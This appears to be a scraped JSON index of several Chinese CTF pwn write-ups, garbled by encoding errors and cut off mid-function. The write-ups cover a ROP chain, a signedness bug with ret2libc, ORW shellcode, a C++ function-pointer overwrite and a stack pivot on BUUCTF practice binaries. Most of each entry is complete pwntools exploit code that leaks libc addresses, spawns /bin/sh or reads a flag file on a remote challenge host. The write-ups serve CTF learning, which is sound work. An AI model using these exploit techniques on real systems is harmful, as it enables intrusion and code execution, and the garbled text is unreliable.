E. Butler\nåŸé¢˜é“¾æ¥\nchecksec ida è§£é¢˜æ€è·¯å¾ˆç®€å•ï¼Œå…ˆåè°ƒç”¨win_function1ã€winfunction2ã€flagå‡½æ•°å³å¯ï¼Œé‡è¦çš„æ˜¯ropé“¾çš„é¡ºåºï¼Œ32ä½ç³»ç»Ÿæ¯”è¾ƒæ‚ä¹±\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./PicoCTF_2018_rop_chain\u0026#34; libc_name: str = \u0026#34;/home/ctf/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;28219\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def sendline_after_clean(content: bytes) -\u0026gt; None: p.clean() p.sendline(content) def interactive_after_clean() -\u0026gt; None: p.clean() p.interactive() #éœ€è¦è‡ªè¡Œè®¾å®šoffset offset:int = 0x18 + 0x4 payload = flat([ m_elf.sym[\u0026#39;win_function1\u0026#39;], m_elf.sym[\u0026#39;win_function2\u0026#39;], m_elf.sym[\u0026#39;flag\u0026#39;], -1163220307, -559039827 ]) payload = flat({offset : payload}) sendline_after_clean(payload) interactive_after_clean() è°ƒç”¨win1ï¼Œå› ä¸ºæ²¡æœ‰å‚æ•°ï¼Œæ‰€ä»¥ä¸ç”¨å®‰æ’æ ˆ ç­‰åˆ°win1ç»“æŸæ—¶ï¼Œæœ‰ä¸€æ¡retæŒ‡ä»¤ï¼Œä¼šå°†win2å¼¹å…¥EIP\nè€Œwin2æ˜¯ä¸€ä¸ªæœ‰å‚æ•°çš„å‡½æ•°ï¼Œä¸ºäº†è·å–æ ˆä¸­å‚æ•°ï¼Œ32ä½ç³»ç»Ÿçš„æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨[ebp+8]ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œebpçš„å€¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næ‰€ä»¥å‚æ•°å’ŒæŒ‡ä»¤ä¹‹é—´è¦éš”å¼€\nflagå‡½æ•°åŒç†\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/","section":"writeup","summary":"Sometimes being a friend means mastering the art of timing. There is a time for silence. A time to let go and allow people to hurl themselves into their own destiny. And a time to prepare to pick up the pieces when it\u0026rsquo;s all over. â€” Octavia E. Butler åŸé¢˜é“¾æ¥ checksec ida è§£é¢˜æ€è·¯å¾ˆç®€å•ï¼Œå…ˆåè°ƒç”¨win_func","tags":["pwn","32ä½ç³»ç»Ÿä¼ å‚"],"title":"ã€32ä½ç³»ç»Ÿä¼ å‚ã€‘BUUCTF picoctf_2018_rop chain"},{"categories":["writeup"],"contents":" Follow effective action with quiet reflection. From the quiet reflection will come even more effective action. â€” Peter Drucker\nåŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp ç¬¦å·ä½æº¢å‡º ret2libc å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ./pwn2_sctf_2016 [*] \u0026#39;/home/peterl/security/workspace/pwn2_sctf_2016/pwn2_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æˆ‘ä»¬å‘ç°ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ•°å­—å†³å®šäº†ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°ï¼Œä½†æ˜¯å¿…é¡»å°äº32ï¼Œè€Œæˆ‘ä»¬æŸ¥çœ‹è¿‡æ ˆæƒ…å†µåå‘ç°32ä¸ªå­—ç¬¦æ˜¯ä¸å¤Ÿçš„\nç„¶åæˆ‘ä»¬å‘ç°get_nçš„ç¬¬äºŒä¸ªå‚æ•°çš„ç±»å‹ä¸ºunsigned intï¼š\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘ç¬¦å·ä½æ¼æ´\næ„å»ºexp ç¬¦å·ä½æº¢å‡º æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨è®¡ç®—æœºä¸­è´Ÿæ•°æ˜¯ç”±è¡¥ç æœºåˆ¶è¡¨ç¤ºçš„ ï¼ˆè¿˜æœ‰å¦ä¸€ç§ä¸æµè¡Œçš„è¡¨ç¤ºæ–¹æ³•ï¼Œå°±æ˜¯æŠŠç¬¬ä¸€ä½ä½œä¸ºç¬¦å·ä½ï¼Œ1è¡¨ç¤ºè´Ÿï¼Œ0è¡¨ç¤ºæ­£ï¼Œå‰©ä¸‹çš„ä½è¡¨ç¤ºæ•°å­—çš„ç»å¯¹å€¼ï¼Œä½†è¿™æ ·ä¼šäº§ç”Ÿ-0å’Œ+0ä¸¤ä¸ª0ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒåŸæœ¬å¦‚æœä¸è€ƒè™‘è´Ÿæ•°ï¼Œæˆ‘ä»¬å¯ä»¥è¡¨ç¤º0~0xffffffffçš„æ­£æ•°ï¼Œä½†æ˜¯ç°åœ¨æˆ‘ä»¬æŠŠå®ƒå¯¹åŠåˆ†ï¼Œç”¨åé¢é‚£ä¸€èŠ‚è¡¨ç¤ºè´Ÿæ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°è½´å°±å˜æˆäº†ï¼š\n0x80000000 ~ 0xffffffff 0 0x1 ~ 0x7fffffff $-2^{31}$ ~ $-1$ $0$ $1$ ~ $2^{31}-1$ ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨Cè¯­è¨€ä¸­è¿›è¡Œæ•°å­—çš„æ¯”è¾ƒæ—¶ï¼Œæˆ‘ä»¬æ˜¯æ¯”è¾ƒçš„å®ƒä»¬é€»è¾‘ä¸Šçš„å€¼ï¼Œä¹Ÿå°±æ˜¯-1 \u0026lt; 32ï¼Œå°½ç®¡-1åœ¨è®¡ç®—æœºå†…éƒ¨çš„æ•°å€¼æ˜¯å¤§äº32çš„ï¼ˆå› ä¸ºè´Ÿæ•°å®é™…çš„å€¼ä¸€å®šæ˜¯å¤§äºç­‰äº0x80000000çš„ï¼Œæ‰€ä»¥è´Ÿæ•°çš„ç¬¬ä¸€ä½ä¸€å®šæ˜¯1ï¼Œè€Œæ­£æ•°çš„ç¬¬ä¸€ä½ä¸€å®šæ˜¯0ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç¬¬ä¸€ä½æ¥åˆ¤æ–­æ•°å­—çš„æ­£è´Ÿäº†ï¼‰\nå¦‚æœæˆ‘ä»¬å°†-1å¼ºåˆ¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•´æ•°ï¼Œé‚£ä¹ˆå®ƒè´Ÿæ•°çš„å±æ€§å°±æ¶ˆå¤±äº†ï¼Œå®ƒé€»è¾‘ä¸Šå°±æ˜¯$2^{32}-1$\nè¿™ç§é€»è¾‘ä¸Šçš„ä¸ä¸€è‡´å°±äº§ç”Ÿäº†ç¬¦å·ä½æ¼æ´\nret2libc è¿™é¢˜æœ€æ— è¯­çš„æ˜¯å®ƒæä¾›äº†ä¸€ä¸ªdo_thingå‡½æ•°ï¼š\næˆ‘è¿˜ä»¥ä¸ºæ˜¯è¦ç”¨syscallåšï¼Œæµªè´¹äº†å¥½å¤šæ—¶é—´æ‰¾èƒ½æ”¹å˜eaxã€ebxã€ecxã€edxçš„gadgetï¼Œç»“æœæ‰¾äº†ä¸€åœˆå°±æ˜¯æ²¡æœ‰èƒ½æ”¹eaxçš„ï¼Œåæ¥æ— å¥ˆåªèƒ½ç”¨ret2libcåš\nè¿™ä¸ªç¨‹åºæœ‰printfå‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡printfå‡½æ•°æ³„éœ²åŸºå€å°±å¥½äº†\nå®Œæ•´exp éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é¢˜çš„libcåœ¨libcdatabaseæ˜¯æœä¸åˆ°çš„ï¼Œå› æ­¤ç”¨ä¸äº†libcsearcher\nå¯ä»¥å»BUUCTFçš„FQAä¸“æ æ‰¾libcçš„ä¸‹è½½åœ°å€\nfrom pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./pwn2_sctf_2016\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485B7\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + pg(m_elf.plt[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;vuln\u0026#39;]) + pg(m_elf.got[\u0026#39;printf\u0026#39;]) p.sendline(payload) p.recvuntil(b\u0026#39;\\n\u0026#39;) printf_addr = u32(p.recv(4)) success(hex(printf_addr)) base_addr = printf_addr - libc.sym[\u0026#39;printf\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] exit_addr: int = base_addr + libc.sym[\u0026#39;exit\u0026#39;] bin_sh_addr: int = base_addr + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) success(hex(base_addr)) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() ret: int = 0x08048346 payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + \\ pg(system_addr) + pg(exit_addr) + pg(bin_sh_addr) p.sendline(payload) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E7%AC%A6%E5%8F%B7%E4%BD%8D%E6%BC%8F%E6%B4%9E+ret2libcpwn2_sctf_2016/","section":"writeup","summary":"Follow effective action with quiet reflection. From the quiet reflection will come even more effective action. â€” Peter Drucker åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp ç¬¦å·ä½æº¢å‡º ret2libc å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åº","tags":["pwn","ç¬¦å·ä½æ¼æ´","ret2libc"],"title":"ã€ç¬¦å·ä½æ¼æ´+ret2libcã€‘pwn2_sctf_2016"},{"categories":["writeup"],"contents":" Never mistake activity for achievement. â€” John Wooden\nåŸé¢˜é“¾æ¥\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x804858A c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: if not isinstance(until, bytes): until = bytes(until, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(until) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) p.send(content) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) send_after_clean(content + p.newline, until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: if isinstance(prev_string, str): prev_string = bytes(prev_string, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(prev_string) if bound is not None and isinstance(bound, str): bound = bytes(bound, encoding=\u0026#34;UTF-8\u0026#34;) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # éœ€è¦è‡ªè¡Œè®¾å®šoffset # ç”Ÿæˆorwçš„shellcode payload = flat([ asm(shellcraft.open(\u0026#34;./flag\u0026#34;)), asm(shellcraft.read(\u0026#39;eax\u0026#39;, \u0026#39;esp\u0026#39;, 0xff)), asm(shellcraft.write(1, \u0026#39;esp\u0026#39;, 0xff)) ]) # payload = payload.ljust(0x30, b\u0026#34;\\x00\u0026#34;) + b\u0026#34;./flag\\x00\u0026#34; sendline_after_clean(payload, \u0026#34;Give my your shellcode:\u0026#34;) interactive_after_clean() æ²¡å•¥å¥½è®²çš„ï¼Œå°±æ˜¯ä¸€ä¸ªç”Ÿæˆorwçš„shellcodeçš„é¢˜ç›®ï¼Œè®°ä¸€ä¸‹orwçš„shellcodeçš„ç”Ÿæˆå‡½æ•°å°±å¥½\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E7%94%9F%E6%88%90orw-shellcodebuuctf-pwnable_orw/","section":"writeup","summary":"Never mistake activity for achievement. â€” John Wooden åŸé¢˜é“¾æ¥ exp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;,","tags":["pwn","ç”ŸæˆORW shellcode"],"title":"ã€ç”ŸæˆORW shellcodeã€‘BUUCTF pwnable_orw"},{"categories":["writeup"],"contents":" Our shared values define us more than our differences. And acknowledging those shared values can see us through our challenges today if we have the wisdom to trust in them again. â€” John McCain\nåŸé¢˜é“¾æ¥\næŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å…¸å‹çš„C++è¯­æ³•ï¼Œè¿™é‡Œåº”è¯¥æœ‰ä¸¤ä¸ªç±»ï¼ŒAdminç»§æ‰¿è‡ªUserï¼š å…¶ä¸­æˆ‘ä»¬å‘ç°Admin::shellæ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„åé—¨å‡½æ•°ï¼š é‚£ä¹ˆæˆ‘ä»¬åªè¦æƒ³åŠæ³•è°ƒç”¨è¿™ä¸ªå‡½æ•°å³å¯ æ•´ä¸ªç¨‹åºæœ‰ä¸¤ä¸ªè¾“å…¥ç‚¹ï¼š åªè¦å¯†ç æ­£ç¡®ï¼Œç¨‹åºå°±ä¼šè°ƒç”¨v8æŒ‡å‘çš„å‡½æ•° è€Œv8åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿv8çš„å€¼æ˜¯v3çš„æŒ‡é’ˆï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªè‡´å‘½æ¼æ´ï¼Œv2æ˜¯ä¸€ä¸ªæ ˆæŒ‡é’ˆè€Œä¸æ˜¯.bssèŠ‚çš„æŒ‡é’ˆã€‚æ‰€ä»¥å¦‚æœè¿”å›mainå‡½æ•°åå†è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œå°±å¯èƒ½æŠŠè¿™ä¸ªåœ°å€è¦†ç›–æ‰ æˆ‘ä»¬çœ‹çœ‹æ±‡ç¼–ä»£ç è¿™ä¸ªæ ˆæŒ‡é’ˆåœ¨å“ªé‡Œ çœ‹æ¥è¿™ä¸ªv2åœ¨[rbp+var_18]å¤„ï¼Œè€Œè¿™ä¸ªå€¼ï¼Œæˆ‘ä»¬åœ¨read_passwordä¸­æ˜¯å¯ä»¥è¦†ç›–çš„ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°†å…¶è¦†ç›–ä¸ºAdmin::shelläº†\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./login\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25767\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... backdoor = 0x400E88 sendline_after_clean(\u0026#34;admin\u0026#34;) payload = flat([ \u0026#34;2jctf_pa5sw0rd\u0026#34;.ljust(0x60-0x18, \u0026#34;\\x00\u0026#34;), backdoor ]) sendline_after_clean(payload) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/c++pwnzjctf-2019login/","section":"writeup","summary":"Our shared values define us more than our differences. And acknowledging those shared values can see us through our challenges today if we have the wisdom to trust in them again. â€” John McCain åŸé¢˜é“¾æ¥ æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å…¸å‹çš„C++è¯­æ³•ï¼Œè¿™é‡Œåº”è¯¥æœ‰ä¸¤ä¸ªç±»ï¼ŒAdminç»§æ‰¿","tags":["pwn","C++Pwn"],"title":"ã€C++Pwnã€‘[ZJCTF 2019]Login"},{"categories":["writeup"],"contents":" If you change the way you look at things, the things you look at change. â€” Wayne Dyer\nåŸé¢˜é“¾æ¥\næŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  é™åˆ¶æº¢å‡ºçš„å­—ç¬¦åˆ°retåªèƒ½æœ‰ä¸€ä¸ªåœ°å€ï¼Œæ²¡æœ‰åé—¨å‡½æ•°ï¼Œå…¸å‹æ ˆè¿ç§»\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./ciscn_s_4\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25030\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def 